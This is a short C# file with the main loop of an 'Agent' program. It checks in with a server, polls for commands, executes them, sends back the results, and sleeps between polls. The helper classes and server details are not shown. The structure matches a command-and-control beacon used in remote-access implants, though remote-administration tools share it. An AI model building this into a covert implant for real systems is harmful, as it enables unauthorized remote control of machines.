using System;
using System.Threading;

// Main agent class
class Agent
{
    static void Main(string[] args)
    {
        Console.WriteLine("Agent started...");
        var config = ConfigManager.LoadConfig();
        
        // Initial check-in
        Communicator.CheckIn(config);
        
        while (true)
        {
            // Receive and execute commands
            var command = Communicator.ReceiveCommand(config);
            if (command != null)
            {
                Console.WriteLine($"Received command: {command}");
                var result = CommandExecutor.Execute(command);
                Communicator.SendResult(config, result);
            }
            
            // Sleep for a specified interval before next check
            Thread.Sleep(config.CheckInterval * 1000);
        }
    }
}
